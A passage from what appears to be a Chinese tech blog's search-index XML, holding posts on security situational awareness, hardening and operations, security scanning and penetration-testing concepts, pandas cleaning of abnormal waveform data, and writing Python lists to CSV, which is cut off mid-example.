Server、Mysql、ES</td><td>SNMP、syslog、专用数据收集代理</td></tr><tr><td>应用中间件</td><td>WebLogic、WebSphere、Jboss/Tomcat、Apache、IIS</td><td>SNMP、syslog、专用数据收集代理</td></tr></tbody></table><p>一般来说将需要监控的数据统一汇聚到安全态势感知平台，通过平台的采集、汇聚、分析、展现能力，实现对网络安全的统一监控和告警通知。</p><p>二、风险感知</p><p>风险感知是指部署相应的监测措施如态势感知平台，主动发现来自系统内外部的安全风险，具体措施包括数据采集、收集汇聚、特征提取、关联分析、状态感知等。</p><ol><li>数据采集<br>数据采集指对网络环境中各类数据进行采集，为网络异常分析、设备预测性维护等提供数据来源。</li><li>收集汇聚<br>对于数据的收集汇聚主要分为两个方面。一是对网络设备系统及应用系统所产生的安全告警数据进行汇聚，包括产品全生命周期的各类数据的同步采集、管理、存储及查询，为后续过程提供数据来源。二是对全网流量进行监听，并将监听过程中采集到的数据进行汇聚。</li><li>特征提取<br>特征提取是指对数据特征进行提取、筛选、分类、优先级排序、可读等处理，从而实现从数据到信息的转化过程，该过程主要是针对单个设备或单个网络的纵向数据分析。信息主要包括内容和情景两方面，内容指网络流量、告警日志信息等；情景指人员的操作指令、人员访问状态、登录事件、时长等。</li><li>关联分析<br>关联分析基于大数据进行横向大数据分析和多维分析，通过将运行机理、运行环境、操作内容、外部威胁情报等有机结合，利用群体经验预测单个设备的安全情况，或根据历史状况和当前状态的差异进行关联分析，进而发现网络及系统的异常状态。</li><li>状态感知<br>状态感知基于关联分析过程，实现对企业网络运行规律、异常情况、安全目标、安全态势、业务背景等的监测感知，确定安全基线，结合大数据分析等相关技术，发现潜在安全威胁、预测黑客攻击行为。</li></ol><p>为了提高安全态势感知与监测的能力和准确性，还需要采取以下措施：</p><ol><li>加强数据分析和挖掘能力：通过对海量数据进行深入分析和挖掘，发现潜在的安全威胁和漏洞。</li><li>建立威胁情报共享机制：通过建立威胁情报共享机制，实现不同组织之间的信息共享和协同作战。</li><li>加强技术创新和研发：通过加强技术创新和研发，不断推出新的安全防护措施和技术手段，提高安全防护能力。</li><li>加强人员培训和管理：通过加强人员培训和管理，提高人员的安全意识和技能水平，减少人为因素对网络安全的影响。</li></ol><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之安全加固和运维</title>
      <link href="/posts/880de541/"/>
      <url>/posts/880de541/</url>
      
        <content type="html"><![CDATA[<p>安全运营是一个将技术、流程和人有机结合的复杂系统工程，通过对已有安全产品、工具和服务产出的数据进行有效的分析，持续输出价值，解决安全问题，以确保网络安全为最终目标。</p><p>安全加固和运维是网络安全运营中的两个重要方面。<br>安全加固是指通过采取一系列措施，提高网络、系统和应用程序的安全性，以防止或减少未经授权的访问、数据泄露或系统损坏。这包括对网络设备、服务器、数据库和其他关键组件进行安全配置和加固，以防止潜在的攻击。<br>运维是指对网络、系统和应用程序的日常管理和维护，以确保其正常运行和性能。这包括监控系统的状态、维护和更新软件、管理网络设备、解决故障等。</p><p>在安全加固方面，一些常见的措施包括：</p><ol><li>更新和修补操作系统、应用程序和网络设备的漏洞。</li><li>配置强密码和多因素身份验证。</li><li>限制不必要的网络端口和服务。</li><li>实施访问控制和权限管理。</li><li>定期备份数据和配置信息。</li></ol><p>在运维方面，一些常见的任务包括：</p><ol><li>监控系统的性能和状态。</li><li>维护和更新软件和操作系统。</li><li>管理网络设备和网络连接。</li><li>解决系统和应用程序故障。</li><li>管理和优化数据库。</li></ol><p>以下从补丁管理、安全加固、日志的监控分析、日常安全运维几个方面来一窥安全加固和运维。</p><h2 id="一、补丁管理"><a href="#一、补丁管理" class="headerlink" title="一、补丁管理"></a>一、补丁管理</h2><p>伴随着软件大小的不断膨胀，潜在的BUG 也不断增加。据估计，1992年发布的Windows3.1 有3 百万行代码。然而，估计它存在15000 到60000处潜在的BUG。1999 年发布的Windows2000 保守估计有三千五百万行代码，也就是说可能存在175,000 到700,000 个潜在的BUG。<br>安全相关的BUG 通常是在大量用户使用，以及黑客或者软件测试者企图进行渗透时才会发现的。一旦BUG 被发现，软件厂商通常会发布一段软件修正这个BUG。这种软件一般称为补丁(patch)、hotfix，或者Service pack。<br>与以往不同的是，只有时刻对出现的漏洞及时做出反应才能够有效地保护系统的有效性、保密性和完整性。几乎每天都会有厂商发布新的补丁，即使有经验的系统管理员也很难保证能够及时使用所有最新的补丁修补系统。<br>补丁管理是指一个区域的系统管理，包括获得、测试和安装多个补丁（代码改变）到一个执行的计算机系统。补丁管理可被看作变动管理的部分。<br>补丁管理任务包括：维持当前的可用补丁的知识；决定对于特定的系统什么样的补丁是合适的；确保补丁正确安装；安装后测试系统；证明所有相关的程序，例如所需的特殊的配置等。<br>在网络环境中，组织通常尝试维护计算机之间的软件版本一致性，并且通常执行集中式补丁管理，而不是允许每台计算机下载自己的补丁。集中式补丁管理使用中央服务器检查网络硬件是否有缺失的补丁、下载缺失的补丁并根据组织的补丁管理策略将其分发到网络上的计算机和其他设备。集中式补丁管理服务器的作用不仅仅是自动化补丁管理；它还使组织能够对补丁管理流程进行一定程度的控制。例如，如果确定某个特定补丁有问题，组织可以配置其补丁管理软件以阻止部署该补丁。集中式补丁管理的另一个优点是它有助于节省互联网带宽。从带宽的角度来看，允许组织中的每台计算机下载完全相同的补丁是没有意义的。相反，补丁管理服务器可以下载补丁一次并将其分发到指定接收它的所有计算机。</p><h2 id="二、安全加固"><a href="#二、安全加固" class="headerlink" title="二、安全加固"></a>二、安全加固</h2><h3 id="1、安全加固作用"><a href="#1、安全加固作用" class="headerlink" title="1、安全加固作用"></a>1、安全加固作用</h3><p>各类网络设备、主机系统、数据库系统、应用系统等的安全状况是动态变化的，对于安全问题的发现及安全加固优化配置等操作都需要非常专业的安全技能，需要进行周期性的安全评估、审计、加固等工作，才能够保障整体安全水平的持续提高。<br>安全加固主要是解决以下安全问题：<br>（1）安装、配置不符合安全需求；<br>（2）使用、维护不符合安全需求；<br>（3）系统完整性被破坏；<br>（4）被植入木马程序；<br>（5）帐户、口令策略问题；<br>（6）安全漏洞没有及时修补；<br>（7）应用服务和应用程序滥用；</p><h3 id="2、安全加固流程"><a href="#2、安全加固流程" class="headerlink" title="2、安全加固流程"></a>2、安全加固流程</h3><p>安全加固是根据专业安全评估结果，制定相应的系统加固方案，针对不同目标系统，通过打补丁、修改安全配置、增加安全机制等方法，合理进行安全性加强。加固的流程和范围如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231219/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E6%B5%81%E7%A8%8B.png" alt="安全加固流程"></p><h3 id="3、安全加固内容"><a href="#3、安全加固内容" class="headerlink" title="3、安全加固内容"></a>3、安全加固内容</h3><p>系统安全加固是指通过一定的技术手段，提高操作系统或网络设备安全性和抗攻击能力。内容包括主机加固、数据库加固、中间件加固、网络设备加固等。</p><h4 id="（1）主机加固"><a href="#（1）主机加固" class="headerlink" title="（1）主机加固"></a>（1）主机加固</h4><p>Windows设备安全加固内容：账号、口令、授权、日志配置操作、日志保护配置、共享文件夹及访问权限、Windows服务、防病毒管理、自动播放、屏幕保护、远程登录控制、补丁管理、IP协议安全配置操作、时间同步服务。<br>Linux操作系统安全加固内容：账号、口令、文件权限、IP协议安全、日志审计、关闭不必要的服务、资源控制。<br>AIX操作系统安全加固内容：账号、口令、授权、日志配置、IP协议安全、路由协议安全、补丁管理、内核调整、服务进程和启动、AIX可被利用的漏洞。</p><h4 id="（2）数据库加固"><a href="#（2）数据库加固" class="headerlink" title="（2）数据库加固"></a>（2）数据库加固</h4><p>加固的内容包括：身份鉴别、访问控制、安全审计、资源控制等安全项加固。加固方法包括：对数据库安全策略、服务等进行安全加固；加强对敏感存储过程的管理，尤其是能执行操作系统命令的存储过程。<br>Oracle数据库安全加固内容：账号、口令、授权、日志审计、远程操作连接。<br>Linux版MySQL数据库安全加固内容：认证授权（以非root用户启动MySQL、口令策略、共享帐号、最小权限、IP地址限制、删除无关帐号）、日志审计、安全文件权限配置、连接数限制。<br>Windows版MySQL安全加固内容：认证授权（以普通用户权限运行MySQL、口令策略、共享帐号、最小权限、IP地址限制、删除无关帐号）、日志审计、安全文件权限配置、连接数限制。<br>SQL Server数据库安全加固内容：账号、口令、授权、日志审计、通信协议、补丁、停用不必要的存储过程。</p><h4 id="（3）中间件加固"><a href="#（3）中间件加固" class="headerlink" title="（3）中间件加固"></a>（3）中间件加固</h4><p>IIS中间件安全加固内容：账号、口令、授权、日志配置操作、日志保护配置、文件系统及访问权限、IIS服务组件、隐藏IIS版本号及敏感信息、版本和补丁管理、IP协议安全配置操作、连接数限制。<br>Linux版Apache安全加固内容:认证授权设置、以非root用户启动Apache、目录安全配置、限制IP地址访问、日志审计设置、配置错误日志、配置访问日志、其他安全设置、隐藏Apache版本号、关闭目录浏览功能（必选）、禁用Apache的执行功能、防御拒绝服务攻击、自定义错误页面、升级使用最新版Apache。<br>Windows版Apache安全加固内容：认证授权设置、以普通用户权限运行Apache、目录安全配置、限制IP地址访问、日志审计设置、配置错误日志、配置访问日志、其他安全设置、隐藏Apache版本号、关闭目录浏览功能（必选）、禁用Apache的执行功能、防御拒绝服务攻击、自定义错误页面。<br>Tomcat中间件安全加固内容：账号、口令、授权、日志配置操作、定时登出、错误页面处理、目录列表访问限制。<br>Weblogic中间件安全加固内容：账号、口令、授权、日志、审计、其他安全配置、定时登出、错误页面处理、禁用Send Server header。</p><h4 id="（4）网络设备加固"><a href="#（4）网络设备加固" class="headerlink" title="（4）网络设备加固"></a>（4）网络设备加固</h4><p>对二层交换设备、三层交换设备、路由器、防火墙等网络设备进行加固，加固内容包括：访问控制、安全审计、网络设备防护等安全项加固。<br>CISCO网络设备安全加固内容：账号、口令、密码复杂度、加固CON端口的登录、加固AUX端口的管理、对网络设备的管理员登录地址进行限制、HTTP登录安全加固、设置登录超时时间、用户权限分配、限制具备管理员权限的用户远程登录、日志配置、日志安全要求、远程日志功能、防止地址欺骗、SNMP服务器配置、使用ssh加密传输、禁用空闲端口、端口级的访问控制策略。<br>HUAWEI网络设备安全加固内容：用户帐号分配、限制具备管理员权限的用户远程登录、无效账户清理、静态口令复杂度、静态口令加密、密码重试、加固CON端口的登录、加固AUX端口的管理、对网络设备的管理员登录地址进行限制、远程登录加密传输、设置登录超时时间、用户权限分配、配置日志功能、对用户操作进行记录、对用户登录进行记录、开启NTP服务保证记录的时间的准确性、远程日志功能、ACL配置、防止地址欺骗、SNMP服务器配置、配置SNMPV2或以上版本、修改SNMP的Community默认通行字、动态路由协议口令要求配置MD5加密、禁止发布或接收不安全的路由信息、MPLS安全、禁用空闲端口、关闭不必要的服务。<br>H3C网络设备安全加固内容：账号、设备特权口令、密码复杂度、设置特权口令(推荐)、关闭未使用的端口、账号口令、Console口密码保护、禁止无关账号、日志配置操作、审核登录、VTY端口防护策略、远程主机IP地址段限制、远程管理通信安全、更改SNMP 服务读写权限管理、修改SNMP默认的Community字符串、Community字符串加密、IP/MAC地址绑定、ARP攻击防御、ARP防止IP报文攻击、关闭设备FTP服务、防源地址欺骗攻击、端口隔离、启用端口安全功能。</p><h4 id="（5）漏洞修复"><a href="#（5）漏洞修复" class="headerlink" title="（5）漏洞修复"></a>（5）漏洞修复</h4><p>漏洞指的是计算机系统(操作系统和应用程序)的缺陷，攻击者可以通过这些缺陷进行非法入侵，实施恶意行为。漏洞修复对这些缺陷进行修补，以减少系统漏洞的暴露。在安全事件发生前防患于未然，包括主机漏洞修复、第三方产品漏洞和应用漏洞，主机漏洞修复主要通过补丁升级、版本升级来修复，第三方产品漏洞需厂商配合，应用漏洞需开发商对软件源码进行修复。</p><h4 id="（6）安全设备调优"><a href="#（6）安全设备调优" class="headerlink" title="（6）安全设备调优"></a>（6）安全设备调优</h4><p>根据信息系统的安全情况和风险情况逐步调整已有的防火墙、堡垒机、安全监控平台、日志审计平台、IPS、WAF等安全设备策略配置，达到最佳的安全防护效果。</p><h2 id="三、日志监控分析"><a href="#三、日志监控分析" class="headerlink" title="三、日志监控分析"></a>三、日志监控分析</h2><p>日志监控分析是从应用系统各结点获得日志文件，采取人工+工具的分析分析方法，形成日志分析报告。该报告与定期评估结果、定期策略分析结果进行综合分析，找到当前的系统及网络设备中存在的问题和隐患，并给信息系统运维提供专业的增强建议。</p><h3 id="1、日志分析流程"><a href="#1、日志分析流程" class="headerlink" title="1、日志分析流程"></a>1、日志分析流程</h3><p>日志分析服务遵循以下流程：<br>（1）日志服务器搭建。将路由器、交换机通过syslog 协议，将Windows 系统的日志通过eventlog 的方式集中转存到搭建的日志服务器上。<br>（2）分析日志。分析关键服务器、防火墙、路由器、交换机等设备的日志, 采取人工加工具的审计分析方法对日志信息进行综合分析,找到当前的系统及网络设备中存在的隐患和被攻击痕迹。<br>（3）生成报告。根据日志分析内容，结合企业信息系统网络的构成及业务流程等，生成专业又极具可读性的报告，并针对日志分析出的各项问题，提出修补建议，使发现的问题能尽可能早的得到解决，避免引起更大范围的影响和损失。<br>（4）其它支持。企业根据报告的内容对系统进行检查和修补，并寻求专业公司帮助和指导。</p><h3 id="2、日志分析内容"><a href="#2、日志分析内容" class="headerlink" title="2、日志分析内容"></a>2、日志分析内容</h3><p>日志分析的内容主要包括：</p><table><thead><tr><th>类型</th><th>内容</th><th>方式</th></tr></thead><tbody><tr><td>网络层</td><td>网络设备日志</td><td>工具、手工</td></tr><tr><td>主机层</td><td>通用的windows 和unix 系统日志，包括：应用程序日志、系统日志、安全日志等。</td><td>工具、手工</td></tr><tr><td>应用</td><td>Web 系统，包括：IIS、Apache；数据库等</td><td>工具、手工</td></tr></tbody></table><h2 id="四、日常安全运维"><a href="#四、日常安全运维" class="headerlink" title="四、日常安全运维"></a>四、日常安全运维</h2><p>日常安全运维是确保网络和系统安全的重要环节。以下是一些日常安全运维的常见任务和注意事项：<br>1、监控网络和系统状态：通过使用各种工具和技术，监控网络和系统的状态，包括流量、设备性能、安全事件等，以便及时发现潜在的安全威胁和问题。<br>2、更新和修补漏洞：定期更新系统和应用程序的补丁和安全更新，以修复已知的安全漏洞。确保及时应用这些更新，以减少被攻击的风险。<br>3、访问控制和权限管理：实施严格的访问控制策略，确保只有授权人员能够访问敏感数据和系统资源。同时，管理用户的权限，确保他们只能访问他们需要的功能和数据。<br>4、入侵检测和防御：部署入侵检测系统和防御措施，以监控和识别潜在的攻击行为。及时响应和处理安全事件，防止攻击者进一步渗透网络和系统。<br>5、日志管理和分析：收集和分析系统日志，以监控和分析潜在的安全威胁和异常行为。通过日志分析，可以及时发现潜在的安全问题并采取相应的措施。<br>5、安全审计和监控：定期进行安全审计和监控，以确保安全策略和措施的有效性。通过审计和监控，可以发现潜在的安全漏洞和问题，并及时采取相应的措施。<br>7、备份和恢复计划：制定备份和恢复计划，以确保在发生安全事件或灾难时能够迅速恢复系统和数据。定期测试备份和恢复计划，以确保其有效性。<br>8、培训和管理：对运维人员进行安全培训和管理，提高他们的安全意识和技能水平。同时，建立完善的安全管理制度，确保运维人员遵守安全规定和操作流程。</p><p>安全加固和运维是相互关联的，因为一个安全的系统需要运维来维护和管理，而运维也需要安全加固来确保系统的安全性。因此，在网络安全领域中，安全加固和运维是密不可分的。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之安全检查和测试</title>
      <link href="/posts/c6e7113b/"/>
      <url>/posts/c6e7113b/</url>
      
        <content type="html"><![CDATA[<p>安全运营是一个将技术、流程和人有机结合的复杂系统工程，通过对已有安全产品、工具和服务产出的数据进行有效的分析，持续输出价值，解决安全问题，以确保网络安全为最终目标。</p><p>安全检查和测试是确保系统、设备或环境安全的重要手段，是安全运营基础工作的一部分。</p><p>安全检查主要通过定期或不定期地对系统、设备或环境进行全面的检查，以发现潜在的安全风险和漏洞。检查的内容可能包括各级人员安全责任制的落实情况、安全活动开展的贯彻落实情况、安全规章制度和措施的落实情况、现场安全管理情况、员工的遵章守纪情况以及员工安全操作规程及安全常识掌握情况等。</p><p>安全测试则是一种通过模拟攻击者的行为，测试系统的安全性，并发现潜在的弱点和漏洞的过程。这可以包括网络渗透测试、应用程序渗透测试等。</p><p>安全检查和测试包括日常的安全扫描、安全检查和针对信息系统的渗透测试。</p><h2 id="一、安全扫描"><a href="#一、安全扫描" class="headerlink" title="一、安全扫描"></a>一、安全扫描</h2><p>通过按照计算机信息系统安全的国家标准、相关行业标准设计、编写、制造的安全扫描工具，分析并指出有关网络的安全漏洞及被测系统的薄弱环节，给出详细的检测报告，并针对检测到的网络安全隐患给出相应的修补措施和安全建议。</p><p>安全扫描目的是提高内部网络安全防护性能和抗破坏能力，检测评估已运行网络的安全性能，为网络系统管理员提供实时安全建议。安全扫描作为一种积极主动的安全防护技术，提供了对内部攻击、外部攻击和误操作的实时保护，在网络系统受到危害之前可以提供安全防护解决方案。</p><p>安全扫描是一种快速有效的安全评估手段，可以发现系统可能存在的部分安全问题，一般会采用安全扫描工具进行安全扫描，漏扫工具会根据目前安全行业漏洞发掘情况，对扫描系统漏洞库不断进行更新。使在扫描过程中，可以发现系统更多的安全问题。</p><p>在安全扫描过程中严格遵守以下原则：</p><p>1）服务不能影响目标系统所承载的业务运行；</p><p>2）服务不能严重影响目标系统的自身性能；</p><p>3）操作时间选择在系统业务量最小，业务临时中断对外影响最小的时候。</p><h2 id="二、安全检查"><a href="#二、安全检查" class="headerlink" title="二、安全检查"></a>二、安全检查</h2><p>安全检查是指安全专家登录主机，网络设备，根据检查列表对可能存在的安全漏洞进行逐项检查，根据检查结果提供详细的漏洞描述和修补方案。人工检查作为人工实施的安全评估手段可以有效弥补由于在防火墙策略或者其他安全设备的防护措施下，安全扫描工具无法扫描发现系统内部特定区域的缺陷。通过安全专家在主机、网络等设备上的实际操作，可以更深程度地发现系统存在的问题及需要安全增强的脆弱点。</p><p>安全检查是信息系统脆弱性发掘的一种有效措施，可以发现系统内部帐号策略、权限管理、日志审核、网络服务等诸多问题。对服务器及网络系统来说人工检查是安全加固的必要步骤。</p><h2 id="三、渗透测试"><a href="#三、渗透测试" class="headerlink" title="三、渗透测试"></a>三、渗透测试</h2><p>渗透测试（penetration test）是通过模拟恶意攻击的方法，来评估系统是否存在安全风险的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，安全渗透测试工程师以攻击者的视角从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。渗透测试还具有的两个显著特点是：渗透测试是一个渐进的并且逐步深入的过程。渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试。</p><p>1、渗透测试方法</p><p>黑盒渗透测试：是为了证明信息系统在网络孤岛的情况下面对 APT 攻击的危险性，系统安全防御是否按照预期计划正常运行而提供的一种测试方案。</p><p>测试过程中，会综合采用各种手段和途径，包括端口扫描，漏洞扫描，密码猜测， 密码破解，数据窃听，伪装欺骗等技术方式。最终目的就是为了检验该网络各个环节的安全性。</p><p>2、模拟渗透测试技术</p><p>模拟渗透入侵测试，是指为了对一个目标网络的安全性进行实际检查，进行不带攻击行为的全面安全检测；是一个在评估目标主机、网络、嵌入式设备的安 全性，模仿黑客特定攻击行为的过程。</p><p>详细地说，是指测试工程师尽可能完整的收集相关信息，利用收集到的信息进行靶场搭建，完整的模拟黑客使用的漏洞发现技术和攻击手段，对目标网络的安全性作完整攻击复现的过程。</p><p>通过安全检查和测试，可以及时发现并解决潜在的安全问题，提高系统的安全性，确保系统、设备或环境的安全稳定运行。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas对波形异常数据处理实战</title>
      <link href="/posts/90eddb0b/"/>
      <url>/posts/90eddb0b/</url>
      
        <content type="html"><![CDATA[<p>做数据分析很大一部分工作量都是在对数据处理，因为数据来源的质量问题，不能保证所有的数据都是正常的。对于数据分析和处理来说pandas无疑是常用的利器。下面通过一个实例来用pandas对波形异常数据进行实战处理。</p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">df_data=pd.read_csv(<span class="string">'data\HRTrend测试波形.csv'</span>)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/1_%E5%8E%9F%E5%A7%8B%E6%B3%A2%E5%BD%A2%E6%95%B0%E6%8D%AE.png" alt="原始波形数据"></p><p>从csv导入的数据是文本字符串类型的，用《<a href="http://xiejava.ishareread.com/posts/9d6f73eb/" target="_blank" rel="noopener">Python将列表中的数据写入csv并正确读取解析</a>》中介绍的方法将文本数据转成列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2list</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.fromstring(str[<span class="number">1</span>:<span class="number">-1</span>], sep=<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">df_data[<span class="string">'HRTrend'</span>]=df_data[<span class="string">'HRTrend'</span>].apply(str2list)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/2_%E6%96%87%E6%9C%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AClist%E5%90%8E%E7%9A%84%E6%B3%A2%E5%BD%A2%E6%95%B0%E6%8D%AE.png" alt="文本字符串转list后的波形数据"><br>用plt查看图形</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig,axes = plt.subplots(<span class="number">3</span>,<span class="number">4</span>,figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        axes[x,y].plot(df_data[<span class="string">'HRTrend'</span>][i])</span><br><span class="line">        i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/3_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E6%B3%A2%E5%BD%A2.png" alt="异常数据波形"></p><p>从图形上看出现了异常。我们抽一个数据进行查看，发现前后有很多空值，并且在数据中也存在缺失值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data[<span class="string">'HRTrend'</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/4_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E5%AE%9E%E4%BE%8B.png" alt="异常数据实例"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(df_data[<span class="string">'HRTrend'</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/5_%E5%BC%82%E5%B8%B8%E5%9B%BE%E5%BD%A2%E5%AE%9E%E4%BE%8B.png" alt="异常图形实例"></p><p>用plt画出图形，可以看到因为有缺失值所以图形并不连续。</p><h2 id="异常数据处理"><a href="#异常数据处理" class="headerlink" title="异常数据处理"></a>异常数据处理</h2><p>为了更好的展示图像，为以后的数据分析准备数据，我们需要将前后的空值去掉，对于中间存在的异常值我们可以用前值或后值进行填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个方法，先将空值用0填充，然后去首尾的0，再将中间存在异常的值用前值填充。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruledata</span><span class="params">(df_cloumn)</span>:</span></span><br><span class="line">    ps=pd.Series(df_cloumn).fillna(<span class="number">0</span>) <span class="comment">#先将为空值用0填充</span></span><br><span class="line">    values=pd.Series(np.trim_zeros(ps)).replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>).values <span class="comment">#去首尾0,然后用异常值填充</span></span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line">df_data[<span class="string">'rule_HRTrend'</span>]=df_data[<span class="string">'HRTrend'</span>].apply(ruledata) <span class="comment">#将异常数据处理的方法进行应用处理异常值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig,axes = plt.subplots(<span class="number">3</span>,<span class="number">4</span>,figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        axes[x,y].plot(df_data[<span class="string">'rule_HRTrend'</span>][i])</span><br><span class="line">        i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231218/6_%E5%BC%82%E5%B8%B8%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%90%8E%E7%9A%84%E6%AD%A3%E5%B8%B8%E5%9B%BE%E5%BD%A2.png" alt="异常数据处理后的正常图形"></p><p>最后可以发现经过异常值修复后图形变得正常连续了。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python将列表中的数据写入csv并正确解析出来</title>
      <link href="/posts/9d6f73eb/"/>
      <url>/posts/9d6f73eb/</url>
      
        <content type="html"><![CDATA[<p>用Python做数据处理常常会将数据写到文件中进行保存，又或将保存在文件中的数据读出来进行使用。通过Python将列表中的数据写入到csv文件中很多人都会，可以通过Python直接写文件或借助pandas很方便的实现将列表中的数据写入到csv文件中，但是写进去以后取出有些字段会有变化有些坑还是要避免。本文通过实例来介绍如何将列表中的数据写入文件如csv并正确解析出来使用。</p><p>示例数据如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = [[<span class="string">'John'</span>, <span class="string">'25'</span>, <span class="string">'Male'</span>,[<span class="number">99</span>,<span class="number">100</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Emily'</span>, <span class="string">'22'</span>, <span class="string">'Female'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Michael'</span>, <span class="string">'30'</span>, <span 